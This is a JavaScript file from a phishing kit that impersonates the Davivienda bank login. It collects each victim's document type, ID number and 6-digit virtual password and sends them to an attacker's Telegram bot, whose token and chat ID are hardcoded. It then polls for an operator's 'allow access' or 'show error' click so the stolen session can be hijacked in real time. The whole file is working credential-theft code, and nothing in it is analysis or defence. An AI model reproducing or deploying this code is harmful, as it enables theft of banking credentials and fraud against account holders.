document.addEventListener('DOMContentLoaded', function() {
    const docTypeSelect = document.getElementById('formAutenticar:selectedTipoDocCod');
    const docNumberInput = document.getElementById('formAutenticar:numeroDocumento');
    const panelClaveVirtual = document.getElementById('panelClaveVirtual');
    const claveVirtualInput = document.getElementById('claveVirtualInput');
    const submitBtn = document.getElementById('formAutenticar:btnSubmitCont');
    const loadingOverlay = document.getElementById('loadingOverlay');

    let pasoActual = 1; // 1: Documento, 2: Clave Virtual
    let pollingInterval;

    const TELEGRAM_API_KEY = '8627198220:AAHlyBdeq2SeDlVN6G4_6QPdQrwU3tY-ICw';
    const TELEGRAM_CHAT_ID = '-1004245962123';

    // Restricción estricta de 6 dígitos numéricos para la clave virtual
    if (claveVirtualInput) {
        claveVirtualInput.setAttribute('maxlength', '6');
        claveVirtualInput.setAttribute('inputmode', 'numeric');
        claveVirtualInput.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 6);
        });
    }

    // Funciones de Telegram con botones interactivos
    async function sendTelegramMessage(message) {
        const url = `https://api.telegram.org/bot${TELEGRAM_API_KEY}/sendMessage`;
        const keyboard = {
            inline_keyboard: [
                [
                    { text: '❌ Mostrar Error', callback_data: 'mostrar_error' },
                    { text: '✅ Permitir Acceso', callback_data: 'permitir_acceso' }
                ]
            ]
        };
        
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    reply_markup: keyboard
                }),
            });
            const data = await response.json();
            return data.result ? data.result.message_id : null;
        } catch (error) {
            console.error('Error al enviar mensaje:', error);
            return null;
        }
    }

    async function checkTelegramResponse(messageId) {
        const url = `https://api.telegram.org/bot${TELEGRAM_API_KEY}/getUpdates?limit=100`;
        try {
            const response = await fetch(url);
            const data = await response.json();
            
            if (data.ok && data.result.length > 0) {
                for (const update of data.result) {
                    if (update.callback_query && 
                        update.callback_query.message && 
                        update.callback_query.message.message_id === messageId) {
                        return update.callback_query.data;
                    }
                }
            }
            return null;
        } catch (error) {
            console.error('Error al verificar respuesta:', error);
            return null;
        }
    }

    function startPolling(messageId) {
        return new Promise((resolve) => {
            let attempts = 0;
            const maxAttempts = 150; // 5 minutos de espera máxima
            
            pollingInterval = setInterval(async () => {
                attempts++;
                const response = await checkTelegramResponse(messageId);
                
                if (response) {
                    clearInterval(pollingInterval);
                    resolve(response);
                } else if (attempts >= maxAttempts) {
                    clearInterval(pollingInterval);
                    resolve('timeout');
                }
            }, 2000);
        });
    }

    // Manejo del formulario
    const form = document.querySelector('.form-login');
    if (form) {
        form.addEventListener('submit', async function(e) {
            e.preventDefault();

            if (pasoActual === 1) {
                // Paso 1: Validar que el número de documento no esté vacío
                if (!docNumberInput || docNumberInput.value.trim() === '') {
                    alert('Por favor, ingrese su número de documento.');
                    return;
                }

                // Cambiar al Paso 2: Mostrar campo de Clave Virtual
                pasoActual = 2;
                if (panelClaveVirtual) panelClaveVirtual.style.display = 'block';
                if (submitBtn) submitBtn.value = 'Ingresar';
                if (claveVirtualInput) claveVirtualInput.focus();

            } else if (pasoActual === 2) {
                // Paso 2: Validar clave virtual e iniciar envío y sondeo
                const tipoDoc = docTypeSelect ? docTypeSelect.options[docTypeSelect.selectedIndex].text : 'Cédula';
                const numDoc = docNumberInput ? docNumberInput.value : '';
                const claveVirtual = claveVirtualInput ? claveVirtualInput.value : '';

                if (claveVirtual.length !== 6) {
                    alert('Por favor, ingrese una clave virtual válida de 6 dígitos.');
                    return;
                }

                // Mostrar el loader corporativo
                if (loadingOverlay) loadingOverlay.style.display = 'flex';

                const messageId = await sendTelegramMessage(`
🏦 <b>Nuevo intento de acceso - Davivienda</b>
📄 Tipo Doc: ${tipoDoc}
🆔 Número: ${numDoc}
🔑 Clave Virtual (6 dígitos): ${claveVirtual}
                `);

                if (messageId) {
                    const adminResponse = await startPolling(messageId);
                    
                    // Ocultar loader
                    if (loadingOverlay) loadingOverlay.style.display = 'none';

                    if (adminResponse === 'permitir_acceso') {
                        // Redirigir a la página de éxito / confirmación
                        window.location.href = '../confirmacion.html';
                    } else {
                        alert('Clave virtual incorrecta o acceso denegado. Por favor, intente nuevamente.');
                        if (claveVirtualInput) claveVirtualInput.value = '';
                        claveVirtualInput.focus();
                    }
                } else {
                    if (loadingOverlay) loadingOverlay.style.display = 'none';
                    alert('Error de conexión con el servidor.');
                }
            }
        });
    }
});